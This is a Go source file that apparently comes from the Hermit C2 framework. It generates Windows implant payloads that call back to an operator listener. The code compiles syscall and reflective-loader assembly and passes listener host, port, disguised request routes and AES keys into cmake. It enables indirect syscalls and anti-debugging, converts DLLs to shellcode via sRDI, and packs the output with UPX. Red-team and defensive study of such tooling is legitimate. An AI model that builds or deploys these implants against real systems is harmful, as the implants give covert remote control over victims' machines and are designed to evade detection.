package payload

import (
	"fmt"
	"os"
	"slices"
	"strings"

	"github.com/google/uuid"
	"github.com/hideckies/hermit/pkg/common/crypt"
	"github.com/hideckies/hermit/pkg/common/meta"
	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/listener"
	utilsSRDI "github.com/hideckies/hermit/pkg/server/payload/utils"
	"github.com/hideckies/hermit/pkg/server/state"
)

type ImplantRequestPaths struct {
	CheckIn    string
	TaskGet    string
	TaskResult string
	WebSocket  string
}

type Implant struct {
	Id               uint
	Uuid             string
	Name             string
	Os               string
	Arch             string
	Format           string
	Lprotocol        string
	Lhost            string
	Lport            uint16
	RequestPaths     ImplantRequestPaths
	Type             string // "beacon", "interactive"
	Sleep            uint
	Jitter           uint
	KillDate         uint
	IndirectSyscalls bool
	AntiDebug        bool
	CompLevel        uint64
}

func NewImplant(
	id uint,
	_uuid string,
	name string,
	os string,
	arch string,
	format string,
	lprotocol string,
	lhost string,
	lport uint16,
	impType string,
	sleep uint,
	jitter uint,
	killDate uint,
	indirectSyscalls bool,
	antiDebug bool,
	compLevel uint64,
) *Implant {
	if _uuid == "" {
		_uuid = uuid.NewString()
	}
	if name == "" {
		name = utils.GenerateRandomAnimalName(false, fmt.Sprintf("implant-%s", impType))
	}

	return &Implant{
		Id:               id,
		Uuid:             _uuid,
		Name:             name,
		Os:               os,
		Arch:             arch,
		Format:           format,
		Lprotocol:        lprotocol,
		Lhost:            lhost,
		Lport:            lport,
		Type:             impType,
		Sleep:            sleep,
		Jitter:           jitter,
		KillDate:         killDate,
		IndirectSyscalls: indirectSyscalls,
		AntiDebug:        antiDebug,
		CompLevel:        compLevel,
	}
}

func (i *Implant) Generate(serverState *state.ServerState) (data []byte, outFile string, err error) {
	// Get the correspoiding listener
	liss, err := serverState.DB.ListenerGetAll()
	if err != nil {
		return nil, "", err
	}
	var lis *listener.Listener = nil
	for _, _lis := range liss {
		if _lis.Protocol == i.Lprotocol && (_lis.Addr == i.Lhost || slices.Contains(_lis.Domains, i.Lhost)) && _lis.Port == i.Lport {
			lis = _lis
			break
		}
	}
	if lis == nil {
		return nil, "", fmt.Errorf("the corresponding listener not found")
	}

	// Get output path
	payloadsDir, err := metafs.GetListenerPayloadsDir(lis.Name, false)
	if err != nil {
		return nil, "", err
	}
	outFile = fmt.Sprintf("%s/%s.%s.%s", payloadsDir, i.Name, i.Arch, i.Format)

	// Get request paths randomly
	reqPathCheckIn := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/implant/checkin"])
	reqPathDownload := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/implant/download"])
	reqPathTaskGet := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/implant/task/get"])
	reqPathTaskResult := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/implant/task/result"])
	reqPathUpload := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/implant/upload"])
	reqPathWebSocket := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/implant/websocket"])
	reqPathSocketOpen := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/socket/open"])
	reqPathSocketClose := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/socket/close"])

	// Generate random AES key and IV
	newAES, err := crypt.NewAES()
	if err != nil {
		return nil, "", err
	}

	// Change to the payload directory
	if i.Os == "linux" {
		return nil, "", fmt.Errorf("linux target is not implemented yet")
	} else if i.Os == "windows" {
		// Change directory
		os.Chdir("./payload/win/implant")
		_, err = meta.ExecCommand("rm", "-rf", "build")
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", err
		}

		// Compile assembly and generate an object file.
		asmSysObj := fmt.Sprintf("/tmp/syscalls-%s.o", uuid.NewString())
		asmRflObj := fmt.Sprintf("/tmp/rfl-%s.o", uuid.NewString())
		asmSysSrc := "src/asm/syscalls."
		asmRflSrc := "src/asm/rfl."
		asmFmt := "win"

		if i.Arch == "amd64" {
			asmSysSrc += "x64.asm"
			asmRflSrc += "x64.asm"
			asmFmt += "64"
		} else {
			asmSysSrc += "x86.asm"
			asmRflSrc += "x86.asm"
			asmFmt += "32"
		}

		_, err = meta.ExecCommand("nasm", "-f", asmFmt, "-o", asmSysObj, asmSysSrc)
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("nasm error: %v", err)
		}
		_, err = meta.ExecCommand("nasm", "-f", asmFmt, "-o", asmRflObj, asmRflSrc)
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("nasm error: %v", err)
		}

		// Compile
		outText, err := meta.ExecCommand(
			"cmake",
			fmt.Sprintf("-DASM_OBJ_SYSCALLS=%s", asmSysObj),
			fmt.Sprintf("-DASM_OBJ_REFLECTIVE=%s", asmRflObj),
			fmt.Sprintf("-DOUTPUT_DIRECTORY=%s", payloadsDir),
			fmt.Sprintf("-DPAYLOAD_NAME=%s", i.Name),
			fmt.Sprintf("-DPAYLOAD_ARCH=%s", i.Arch),
			fmt.Sprintf("-DPAYLOAD_FORMAT=%s", i.Format),
			fmt.Sprintf("-DPAYLOAD_TYPE=\"%s\"", i.Type),
			fmt.Sprintf("-DPAYLOAD_SLEEP=%s", fmt.Sprint(i.Sleep)),
			fmt.Sprintf("-DPAYLOAD_JITTER=%s", fmt.Sprint(i.Jitter)),
			fmt.Sprintf("-DPAYLOAD_KILLDATE=%s", fmt.Sprint(i.KillDate)),
			fmt.Sprintf("-DPAYLOAD_INDIRECT_SYSCALLS=%t", i.IndirectSyscalls),
			fmt.Sprintf("-DPAYLOAD_ANTI_DEBUG=%t", i.AntiDebug),
			fmt.Sprintf("-DLISTENER_PROTOCOL=\"%s\"", i.Lprotocol),
			fmt.Sprintf("-DLISTENER_HOST=\"%s\"", i.Lhost),
			fmt.Sprintf("-DLISTENER_PORT=%s", fmt.Sprint(i.Lport)),
			fmt.Sprintf("-DREQUEST_PATH_CHECKIN=\"%s\"", reqPathCheckIn),
			fmt.Sprintf("-DREQUEST_PATH_DOWNLOAD=\"%s\"", reqPathDownload),
			fmt.Sprintf("-DREQUEST_PATH_TASKGET=\"%s\"", reqPathTaskGet),
			fmt.Sprintf("-DREQUEST_PATH_TASKRESULT=\"%s\"", reqPathTaskResult),
			fmt.Sprintf("-DREQUEST_PATH_UPLOAD=\"%s\"", reqPathUpload),
			fmt.Sprintf("-DREQUEST_PATH_WEBSOCKET=\"%s\"", reqPathWebSocket),
			fmt.Sprintf("-DREQUEST_PATH_SOCKET_OPEN=\"%s\"", reqPathSocketOpen),
			fmt.Sprintf("-DREQUEST_PATH_SOCKET_CLOSE=\"%s\"", reqPathSocketClose),
			fmt.Sprintf("-DAES_KEY_BASE64=\"%s\"", newAES.Key.Base64),
			fmt.Sprintf("-DAES_IV_BASE64=\"%s\"", newAES.IV.Base64),
			"-S.",
			"-Bbuild",
		)
		if err != nil {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("cmake error: %v", err)
		}
		if strings.Contains(strings.ToLower(outText), "error:") {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("cmake error: %s", outText)
		}

		outText, err = meta.ExecCommand(
			"cmake",
			"--build", "build",
			"--config", "Release",
			"-j", fmt.Sprint(serverState.NumCPU),
		)
		if err != nil {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("cmake error: %v", err)
		}
		if strings.Contains(strings.ToLower(outText), "error:") {
			os.Chdir(serverState.CWD)
			os.Remove(asmSysObj)
			os.Remove(asmRflObj)
			return nil, "", fmt.Errorf("cmake error: %s", outText)
		}

		os.Remove(asmSysObj)
		os.Remove(asmRflObj)

		// sRDI ------------------------------------------------------------------------------
		// If the format is '.bin', convert DLL to shellcode
		if strings.HasSuffix(outFile, ".bin") {
			dllFile := strings.Replace(outFile, ".bin", ".dll", -1)

			_, err := utilsSRDI.GenerateSRDIShellcode(dllFile, "Start")
			if err != nil {
				// Remove .dll file
				removeErr := os.Remove(dllFile)
				if removeErr != nil {
					stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
				}
				return nil, "", fmt.Errorf("sRDI Error: %v", err)
			}

			// Remove .dll file
			removeErr := os.Remove(dllFile)
			if removeErr != nil {
				stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
			}
		}
		// ---------------------------------------------------------------------------------------
	} else {
		return nil, "", fmt.Errorf("target is not recognized")
	}

	// Compress the file with UPX
	if i.CompLevel > 0 {
		outText, err := meta.ExecCommand(
			"upx",
			fmt.Sprintf("-%d", i.CompLevel),
			outFile,
		)
		if err != nil {
			return nil, "", fmt.Errorf("upx error: %v", err)
		}
		if strings.Contains(strings.ToLower(outText), "error:") {
			return nil, "", fmt.Errorf("upx error: %s", outText)
		}
	}

	data, err = os.ReadFile(outFile)
	if err != nil {
		os.Chdir(serverState.CWD)
		return nil, "", err
	}

	// Go back to the current directory
	os.Chdir(serverState.CWD)

	return data, outFile, nil
}
